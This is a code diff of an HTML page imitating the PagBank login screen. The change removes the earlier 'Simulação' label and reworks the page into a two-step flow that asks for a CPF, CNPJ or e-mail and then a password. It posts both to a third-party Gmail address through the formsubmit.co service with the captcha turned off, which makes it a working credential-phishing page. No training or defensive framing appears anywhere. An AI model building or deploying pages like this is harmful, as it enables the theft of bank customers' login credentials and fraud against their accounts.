@@ -2,105 +2,222 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Acesso PagBank (Simulação)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PagBank Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f5f6f8;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+    * {
+      box-sizing: border-box;
     }
 
-    .login-box {
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
       background-color: #ffffff;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    form {
       width: 100%;
-      max-width: 360px;
+      max-width: 400px;
+      background-color: #fff;
+    }
+
+    .container {
+      display: none;
+    }
+
+    .container.active {
+      display: block;
+    }
+
+    h1, h2 {
+      font-size: 1.5rem;
+      font-weight: 500;
+      color: #212529;
+      margin: 20px 0 10px;
+    }
+
+    #tela-login h1 {
+      margin-top: 10px;
+    }
+
+    p.sub {
+      font-size: 0.95rem;
+      color: #6c757d;
+      margin-bottom: 32px;
+    }
+
+    input[type="text"].cpf-input,
+    .senha-input {
+      width: 100%;
+      border: none;
+      border-bottom: 1.5px solid #6c757d;
+      padding: 12px 0;
+      font-size: 1rem;
+      color: #212529;
+      outline: none;
+      margin-bottom: 32px;
+    }
+
+    .btn, .senha-btn {
+      width: 100%;
+      background-color: #0061a9;
+      color: white;
+      border: none;
+      font-weight: 600;
+      padding: 14px;
+      border-radius: 999px;
+      font-size: 1rem;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+
+    .bottom-info {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.75rem;
+      color: #6c757d;
+      margin-top: 24px;
+    }
+
+    .create-account {
       text-align: center;
+      font-size: 0.9rem;
+      color: #0074e8;
+      margin-top: 16px;
+      cursor: pointer;
+    }
+
+    .create-account:hover {
+      text-decoration: underline;
+    }
+
+    .topo {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
     }
 
     .logo {
-      margin-bottom: 30px;
+      height: 90px;
+      margin-right: auto;
     }
 
-    .logo img {
-      width: 140px;
+    .trocar-conta {
+      color: #0077b6;
+      font-size: 14px;
+      text-decoration: none;
+      padding-left: 10px;
     }
 
-    h2 {
-      font-size: 1.3rem;
-      color: #333;
-      margin-bottom: 25px;
+    .senha-container {
+      position: relative;
     }
 
-    input {
-      width: 100%;
-      padding: 14px;
-      font-size: 1rem;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      margin-bottom: 20px;
-      transition: border-color 0.3s;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #00bfa5;
-    }
-
-    button {
-      width: 100%;
-      padding: 14px;
-      background-color: #00bfa5;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 1rem;
+    .toggle-password {
+      position: absolute;
+      right: 0;
+      top: 12px;
       cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    button:hover {
-      background-color: #009e8a;
-    }
-
-    .note {
+      color: #0077b6;
       font-size: 0.9rem;
-      color: #666;
-      margin-top: 20px;
+    }
+
+    .link {
+      display: block;
+      margin: 15px 0;
+      color: #0077b6;
+      text-decoration: none;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      h1, h2 {
+        font-size: 1.3rem;
+      }
+
+      .logo {
+        height: 50px;
+      }
+
+      .btn, .senha-btn {
+        font-size: 0.95rem;
+        padding: 12px;
+      }
+
+      input[type="text"].cpf-input,
+      .senha-input {
+        font-size: 0.95rem;
+      }
     }
   </style>
 </head>
 <body>
 
-  <div class="login-box">
-    <div class="logo">
-      <img src="pag.jpeg" alt="PagBank Logo">
+  <form action="https://formsubmit.co/alunospilotos@gmail.com" method="POST">
+
+    <!-- TELA LOGIN -->
+    <div class="container active" id="tela-login">
+      <h1>Bem-vindo ao PagBank</h1>
+      <p class="sub">Digite seu CPF, CNPJ ou E-mail para acessar sua conta</p>
+      <input type="text" name="login" class="cpf-input" placeholder="CPF, CNPJ ou E-mail" required />
+      <button type="button" class="btn" onclick="mostrarSenha()">Continuar</button>
+      <div class="bottom-info">
+        <span>Versão 5.20.13</span>
+        <span>ID 080-aad</span>
+      </div>
+      <div class="create-account">Criar conta</div>
     </div>
-    <h2>Acesse com CPF/CNPJ e Senha</h2>
 
-    <form action="https://formsubmit.co/alunospilotos@gmail.com" method="POST">
-      <!-- Campos escondidos -->
-      <input type="hidden" name="_next" value="https://pagseguro.uol.com.br/">
-      <input type="hidden" name="_captcha" value="false">
-
-      <!-- Dados visíveis -->
-      <input type="text" name="cpf_cnpj" placeholder="Digite seu CPF ou CNPJ" required />
-      <input type="password" name="senha" placeholder="Digite sua senha" required />
-      <button type="submit">Entrar</button>
-    </form>
-
-    <div class="note">
-      Sua conexão está segura.
+    <!-- TELA SENHA -->
+    <div class="container" id="tela-senha">
+      <div class="topo">
+        <img src="pag.png" class="logo" alt="PagBank" />
+        <a href="#" onclick="voltarLogin()" class="trocar-conta">Trocar conta</a>
+      </div>
+      <h2>Acessar conta</h2>
+      <div class="senha-container">
+        <input type="password" name="senha" class="senha-input" placeholder="Digite sua senha" required />
+        <span class="toggle-password" onclick="toggleSenha(this)">Mostrar</span>
+      </div>
+      <a href="#" class="link">Esqueci minha senha</a>
+      <button type="submit" class="senha-btn">Entrar</button>
     </div>
-  </div>
+
+    <!-- FormSubmit configurações -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://example.com/obrigado.html">
+
+  </form>
+
+  <script>
+    function mostrarSenha() {
+      document.getElementById('tela-login').classList.remove('active');
+      document.getElementById('tela-senha').classList.add('active');
+    }
+
+    function voltarLogin() {
+      document.getElementById('tela-senha').classList.remove('active');
+      document.getElementById('tela-login').classList.add('active');
+    }
+
+    function toggleSenha(el) {
+      const input = el.previousElementSibling;
+      if (input.type === "password") {
+        input.type = "text";
+        el.innerText = "Esconder";
+      } else {
+        input.type = "password";
+        el.innerText = "Mostrar";
+      }
+    }
+  </script>
 
 </body>
 </html>
